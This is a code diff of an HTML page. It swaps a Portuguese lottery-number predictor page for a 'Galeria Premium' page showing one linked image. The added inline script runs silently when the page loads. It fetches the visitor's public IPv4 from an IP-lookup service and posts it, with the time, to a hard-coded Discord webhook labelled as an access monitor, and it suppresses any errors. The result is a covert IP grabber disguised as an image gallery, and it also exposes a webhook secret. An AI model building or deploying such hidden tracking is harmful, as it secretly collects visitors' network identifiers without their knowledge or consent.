@@ -3,49 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lotofácil Predictor Premium</title>
+    <title>Galeria Premium</title>
     <link rel="stylesheet" href="style.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="background-animate"></div>
-    
-    <main class="container">
-        <header class="hero">
-            <h1>Loto<span>Fácil</span> Predictor</h1>
-            <p>Análise avançada baseada em toda a história da Lotofácil para potencializar suas chances.</p>
-        </header>
+    <div class="pulse"></div>
+    <div class="container">
+        <h1>Bem-vindo à Galeria</h1>
+        <div class="image-wrapper">
+            <a href="https://ibb.co/NnbMN37c">
+                <img src="https://i.ibb.co/JFg9pdCD/big-monke-flips-you-off-what-u-do-v0-861gk9gqka0c1.webp" alt="big monke flips you off what u do v0 861gk9gqka0c1">
+            </a>
+        </div>
+    </div>
 
-        <section class="stats-overview" id="stats-overview">
-            <div class="stat-card glass">
-                <span class="label">Último Concurso</span>
-                <span class="value" id="last-draw-num">---</span>
-            </div>
-            <div class="stat-card glass">
-                <span class="label">Total de Concursos</span>
-                <span class="value" id="total-draws">---</span>
-            </div>
-        </section>
+    <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1469192703320260772/CueoZRu2zNRzNbodoXsl2NZ90xI4iyTj642wqSmAro---yLzi6SKvNwhxhbsG0CJkB2L';
 
-        <section class="actions">
-            <button id="generate-btn" class="btn-primary">
-                Gerar 3 Jogos Estratégicos
-                <div class="btn-glow"></div>
-            </button>
-        </section>
+        async function obterIpEnviarWebhook() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ipv4 = data.ip;
 
-        <section class="results-container" id="results-container">
-            <!-- Os jogos gerados aparecerão aqui -->
-        </section>
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🚀 Novo Acesso Detectado",
+                            color: 16727650,
+                            fields: [
+                                {
+                                    name: "Endereço IPv4",
+                                    value: `\`${ipv4}\``,
+                                    inline: true
+                                },
+                                {
+                                    name: "Horário",
+                                    value: new Date().toLocaleString('pt-BR'),
+                                    inline: true
+                                }
+                            ],
+                            footer: {
+                                text: "Monitor de Acessos"
+                            }
+                        }]
+                    })
+                });
+            } catch (error) {
+                // Erro silenciado para o usuário final
+            }
+        }
 
-        <section class="analysis-info glass">
-            <h3>Nossa Estratégia</h3>
-            <p>Utilizamos um algoritmo de pesos que analisa a <strong>frequência histórica</strong>, a <strong>recência</strong> (últimos 20 jogos) e o <strong>atraso</strong> de cada número. Os jogos gerados são validados em filtros de paridade e números primos para alinhar com os padrões mais comuns da loteria.</p>
-        </section>
-    </main>
-
-    <script src="script.js"></script>
+        window.addEventListener('load', obterIpEnviarWebhook);
+    </script>
 </body>
 </html>
